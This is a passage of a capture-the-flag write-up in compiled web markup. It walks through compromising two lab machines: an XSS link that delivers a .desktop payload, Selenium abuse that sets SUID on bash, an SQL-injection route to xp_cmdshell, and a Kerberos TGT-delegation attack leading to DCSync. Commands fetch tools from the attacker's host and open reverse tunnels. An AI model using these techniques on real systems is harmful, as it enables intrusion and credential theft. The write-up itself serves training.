punctuation\",children:\"</\"}),\"a\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"At this point, we don\\u2019t know whether the bot will download the script or not. We can try both approachs.\"}),`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"The easy way is just to host the file in a localwebserver.\"}),`\n`]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsx)(n.code,{className:\"language-html code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"a\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"className\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"an\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"open\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"http://ip:port/pwn.desktop\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),\"test\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"</\"}),\"a\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]})})}),`\n`,(0,e.jsxs)(n.ol,{start:\"2\",children:[`\n`,(0,e.jsxs)(n.li,{children:[\"The other way is to hope that downloads the file.\",`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Spoilers: the bot also downloads the file u.u\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We know from the source that it gets downloaded in \",(0,e.jsx)(n.code,{children:\"/opt/userland\"}),\" and we retrieve the random file name with two ways as well.\"]}),`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Downloading the file locally using the gui, we need to create a writeable /opt/userland in our local system)\"}),`\n`,(0,e.jsx)(n.li,{children:\"Using the Web API to upload the file and the filename will be in the response\"}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:\"In this case our payload will be:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsx)(n.code,{className:\"language-html code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"a\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"className\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"an\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"open\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"file:///opt/userland/5b208f3cb06c3d4a44afa8c948f9aa35.desktop\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),\"test\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"</\"}),\"a\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"Once we make sure the payload is hosted/downloaded we can send the HTML payload and wait until we get a shell.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/payload-xss-rendered.png\",alt:\"A screenshot that shows that our XSS payload is rendered\"})}),`\n`,(0,e.jsx)(n.p,{children:\"And we get a shell back!\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/user-flag-john.png\",alt:\"A screenshot where we got a shell back as john\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"privilege-escalation-1\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#privilege-escalation-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Privilege Escalation\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The first thing I\\u2019ve checked is the running processes as \",(0,e.jsx)(n.code,{children:\"root\"}),\". In this case, I\\u2019ve found a Selenium server running as root locally.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"623\"}),\"       \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),`:12 ?        00:00:00 /usr/sbin/cron -f -P\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"638\"}),\"     \",(0,e.jsx)(n.span,{className:\"token number\",children:\"623\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),\":12 ?        00:00:00  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),`_ /usr/sbin/CRON -f -P\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"641\"}),\"     \",(0,e.jsx)(n.span,{className:\"token number\",children:\"638\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),\":12 ?        00:00:00      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\"_ /bin/sh -c java -jar /root/selenium-server-4.4.0.jar standalone --host \",(0,e.jsx)(n.span,{className:\"token number\",children:\"127.0\"}),`.0.1\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"643\"}),\"     \",(0,e.jsx)(n.span,{className:\"token number\",children:\"641\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),\":12 ?        00:00:31          \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\"_ java -jar /root/selenium-server-4.4.0.jar standalone --host \",(0,e.jsx)(n.span,{className:\"token number\",children:\"127.0\"}),`.0.1\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The idea behind exploiting Selenium is to create a session that executes code. In simpler words, we can achieve RCE through geckodriver.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"First I\\u2019ll forward the port \",(0,e.jsx)(n.code,{children:\"4444\"}),\" running locally on the machine to my local machine using \",(0,e.jsx)(n.code,{children:\"chisel\"}),\". I\\u2019ll run a chisel server on my machine:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:~/htb-trustable \\xBB chisel server -p 8888 --reverse\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:10:10 server: Reverse tunnelling enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:10:10 server: Fingerprint H7MAdhulXPbLGvJaJWk7UmAzd8e/4NPB4rlR4eDaklQ=\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:10:10 server: Listening on http://0.0.0.0:8888\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Download chisel to the remote machine and I\\u2019ll forward the port:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ wget 10.10.14.57/chisel\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ chmod +x ./chisel\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ ./chisel client 10.10.14.57./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And we\\u2019ll get a connection.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:11:47 server: session#1: tun: proxy#R:4444=>4444: Listening\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we can access the Selenium Grid from our machine.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/selenium-grid-web.png\",alt:\"A screenshot of Selenium web grid interface\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And now I\\u2019ll create the malicious session where it will set the \",(0,e.jsx)(n.code,{children:\"suid\"}),\" bit to the \",(0,e.jsx)(n.code,{children:\"/bin/bash\"}),\" binary.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token request-line\",children:[(0,e.jsx)(n.span,{className:\"token method property\",children:\"POST\"}),\" \",(0,e.jsx)(n.span,{className:\"token request-target url\",children:(0,e.jsxs)(n.span,{className:\"token path\",children:[(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"wd\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"hub\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"session\"]})}),\" \",(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Host\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"localhost:4444\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"User-Agent\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"python-requests/2.27.1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept-Encoding\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"gzip, deflate\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"*/*\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json;charset=utf-8\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"276\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:` {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    \"capabilities\": {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        \"alwaysMatch\": {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`            \"browserName\": \"chrome\",\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`            \"goog:chromeOptions\": {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`                \"binary\": \"/usr/bin/python3\",\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`                \"args\": [\"-cimport os;os.system('chmod u+s /bin/bash')\"]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`            }\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        }\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    }\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`}\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"After making the request, we can see in the UI that our request is in queue.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/selenium-web-queue.png\",alt:\"A screenshot of the Selenium Web queue that shows our payload\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Once it disappears from the queue, it means it\\u2019s finished.\"}),`\n`,(0,e.jsx)(n.p,{children:\"We can go back to the remote machine and check.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ ls -la /bin/bash           ls -la /bin/bash\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`ls -la /bin/bash\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And it worked!\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ /bin/bash -p               /bin/bash -p\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/bash -p\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`id\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`cat /root/root.txt\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`STF22{bbe7145febbce7ddd4dd3e22a37e93d1}\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And thats it for this one!\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"lookout-fullpwn-2000-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#lookout-fullpwn-2000-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Lookout (Fullpwn, 2000 Points)\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Note: This will be a short writeup as I used two unintended ways to get system on the machine.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"enumeration-2\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#enumeration-2\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Enumeration\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"I\\u2019ll start with an \",(0,e.jsx)(n.code,{children:\"nmap\"}),\" scan with the usual options:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 80/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 135/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 445/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 139/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 53/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 3269/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 389/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 88/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 636/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 3268/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 593/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 464/tcp on 10.129.254.249\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"For the sake of the writeup, I\\u2019ll jump straight to the webserver on port 80, where we have a way to execute some commands such as \",(0,e.jsx)(n.code,{children:\"ping\"}),\", \",(0,e.jsx)(n.code,{children:\"traceroute\"}),\", and \",(0,e.jsx)(n.code,{children:\"nslookup\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/Lookout-Utility-WebPage.png\",alt:\"A screenshot of the Lookout Utility WebPage\"})}),`\n`,(0,e.jsx)(n.p,{children:\"This page is not vulnerable to anything, so I\\u2019ll just ping my box for now:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/Scan-Results.png\",alt:\"A screenshot of the Scan Results that we runned through the utility\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can check in the \",(0,e.jsx)(n.code,{children:\"Past Scans\"}),\" that our scan was created!\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/Past-Results.png\",alt:\"A screenshot that shows all the Past Results\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can notice that we delete the scan with the X under action. I\\u2019ll intercept that request using burp to play a bit with it:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/request-delete-scan.png\",alt:\"A screenshot that shows the request delete scan\"})}),`\n`,(0,e.jsx)(n.p,{children:\"After a few tries, I noticed it was vulnerable to an SQLi:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/testing-sqli-sleep.png\",alt:\"A screenshot where we test testing SQLi sleep and that shows the 5 seconds delay\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"exploitation-2\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation-2\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The first thing I\\u2019ve tried was to enable \",(0,e.jsx)(n.code,{children:\"xp_cmdshell\"}),\" and use it get code execution:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`EXEC sp_configure 'show advanced options', 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`RECONFIGURE-- -\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`EXEC sp_configure 'xp_cmdshell', '1'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`RECONFIGURE\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/configure1.png\",alt:\"A screenshot of xp_cmdshell configuration\"})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/configure2.png\",alt:\"A screenshot of xp_cmdshell configuration\"})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/configure3.png\",alt:\"A screenshot of xp_cmdshell configuration\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Then we can use \",(0,e.jsx)(n.code,{children:\"EXEC xp_cmdshell '<COMMAND>'\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/rce-sqli.png\",alt:\"A screenshot of executing xp_cmdshell to get a reverse shell through powershell\"})}),`\n`,(0,e.jsx)(n.p,{children:\"And we get a shell as the nt service:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/shell-as-service-nt.png\",alt:\"A screenshot of getting a shell as nt service\"})}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Nothing that we can directly get a shell with sqlmap\"}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/sqlmap-result.png\",alt:\"A screenshot that shows the sqlmap results\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"privilege-escalation-2\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#privilege-escalation-2\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Privilege Escalation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Since we have a shell as service account. we can get system directly with two ways.\"}),`\n`,(0,e.jsxs)(n.h4,{id:\"first-way\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#first-way\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"First Way\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The Service accounts are vulnerable to TGT delegation attacks using Rubeus because the service account is often configured with high privileges on the local system, such as the ability to create and modify user accounts and other system resources.\"}),`\n`,(0,e.jsx)(n.p,{children:\"The idea is to get valid TGT (Ticket-Granting Ticket) for the service account, to perform a DCSync attack and then PSExec into the machine as administrator.\"}),`\n`,(0,e.jsx)(n.p,{children:\"First I\\u2019ll upload Rubeus to the remove machine.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color> wget 10.10.14.57/Rubeus.exe -o r.exe\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"Then I\\u2019ll use it to generate a TGT for the service account.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color> .\\\\r.exe tgtdeleg /nowrap\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`.\\\\r.exe tgtdeleg /nowrap\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   ______        _\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  (_____ \\\\      | |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   _____) )_   _| |__  _____ _   _  ___\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  |  __  /| | | |  _ \\\\| ___ | | | |/___)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  | |  \\\\ \\\\| |_| | |_) ) ____| |_| |___ |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  |_|   |_|____/|____/|_____)____/(___/\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  v2.2.0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Action: Request Fake Delegation TGT (current user)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/LOOKOUT-DC.LOOKOUT.local'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Kerberos GSS-API initialization success!\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Found the AP-REQ delegation ticket in the GSS-API output.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Authenticator etype: aes256_cts_hmac_sha1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Extracted the service ticket session key from the ticket cache: CYLfo1W5+vf4ZTDXhdsbhxx6n45eG6ONzEKGryITLUg=\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Successfully decrypted the authenticator\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] base64(ticket.kirbi):\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`      doIF3jCCBdqgA<SNIIIIIIIIIP>AWoAMCAQGFM\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"I\\u2019ll save to my local machine and convert the ticket with \",(0,e.jsx)(n.code,{children:\"TicketConverter\"}),\" from \",(0,e.jsx)(n.code,{children:\"impacket\"}),\".\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB cat ticket| base64 -d > ticket.kirbi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB impacket-ticketConverter ticket.kirbi ticket.ccache\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] converting kirbi to ccache...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] done\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Then I\\u2019ll export it to my env variables.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB export KRB5CCNAME=/tmp/wr/ticket.ccache\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"One last thing, we need to synchronize our local time to the server, otherwise it won\\u2019t work.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`sudo ntpdate 10.129.254.249\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now to perform a DCSync on the target, we can use impacket\\u2019s \",(0,e.jsx)(n.code,{children:\"secretsdump.py\"}),\" script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB impacket-secretsdump LOOKOUT-DC.LOOKOUT.local -dc-ip 10.129.254.249 -no-pass 